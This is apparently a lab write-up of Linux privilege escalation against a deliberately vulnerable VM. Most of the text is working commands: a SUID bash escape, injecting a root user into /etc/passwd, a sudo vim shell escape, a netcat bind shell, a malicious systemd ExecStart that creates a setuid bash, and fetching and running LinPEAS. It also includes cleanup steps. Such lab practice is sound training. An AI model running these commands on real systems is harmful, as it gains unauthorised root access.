# 🐧 Linux Privilege Escalation Lab – Walkthrough Report

This walkthrough document captures each step taken during the hands-on privilege escalation lab using a vulnerable Linux Mint VM and a Parrot OS attacker VM. Screenshots were taken throughout the process to document key stages of exploitation.

---

## 🖥️ Environment Overview

* **Victim VM**: Linux Mint
* **Attacker VM**: Parrot OS
* **Network Setup**: Host-Only Adapter (VMware Workstation Pro)

---

## 🔧 Initial Setup

1. Verified IP connectivity between VMs using `ip a` and `ping`
2. Started SSH on the victim machine: `sudo systemctl start ssh`
3. Logged into the victim machine from attacker using:

   ```bash
   ssh intern@<victim-ip>
   # password: password
   ```

✅ Screenshot: Successful SSH login and `whoami` as `intern`

---

## 🔰 Basic Privilege Escalation Techniques

### 1. 📍 SUID Binary Exploitation

* Enumerated SUID binaries:

  ```bash
  find / -perm -4000 2>/dev/null
  ```
* Found `/usr/local/bin/suidbash`
* Exploited it:

  ```bash
  /usr/local/bin/suidbash -p
  whoami
  ```

✅ Screenshot: Root shell via SUID

---

### 2. 📍 Writable `/etc/passwd`

* Confirmed writable permissions:

  ```bash
  ls -l /etc/passwd
  ```
* Appended fake root user:

  ```bash
  echo 'hacked::0:0::/root:/bin/bash' >> /etc/passwd
  su hacked
  ```

✅ Screenshot: Root shell via passwd injection

---

### 3. 📍 Sudo Misconfiguration (`vim`)

* Listed allowed sudo commands:

  ```bash
  sudo -l
  ```
* Found `NOPASSWD: /usr/bin/vim`
* Gained root shell via:

  ```bash
  sudo vim -c ':!bash'
  whoami
  ```

✅ Screenshot: Root shell via vim escape

---

## 🔥 Advanced Privilege Escalation Techniques

### 4. 📍 Netcat `setcap` Bind Shell

* Verified capability:

  ```bash
  getcap -r / 2>/dev/null
  ```
* On victim:

  ```bash
  /usr/bin/nc.traditional -lp 80 -e /bin/bash
  ```
* On attacker:

  ```bash
  nc <victim-ip> 80
  whoami
  ```

✅ Screenshot: Remote root shell via netcat

---

### 5. 📍 Writable systemd service

* Edited vulnerable service:

  ```bash
  nano /etc/systemd/system/vuln.service
  ```
* Malicious `ExecStart`:

  ```ini
  ExecStart=/bin/bash -c 'cp /bin/bash /tmp/rooted && chmod +s /tmp/rooted'
  ```
* Reloaded and restarted:

  ```bash
  sudo systemctl daemon-reexec
  sudo systemctl daemon-reload
  sudo systemctl restart vuln
  /tmp/rooted -p
  ```

✅ Screenshot: Rooted binary + root shell

---

### 6. 📍 Leaked Config Credentials

* Read secret environment file:

  ```bash
  cat /etc/secret.env
  ```
* Used credentials to `su root`:

  ```bash
  su root
  # password: SuperSecret123
  ```

✅ Screenshot: `su` to root via leaked secret

---

## 🧪 Optional Recon: LinPEAS

* Ran enumeration script:

  ```bash
  wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
  chmod +x linpeas.sh
  ./linpeas.sh
  ```

✅ Screenshot: LinPEAS output highlighting exploitable paths

---

## 🧼 Cleanup Commands (Post-Lab)

```bash
rm /usr/local/bin/suidbash
chmod 644 /etc/passwd
setcap -r /usr/bin/nc.traditional
rm /etc/secret.env
rm /etc/systemd/system/vuln.service
systemctl daemon-reload
```

---
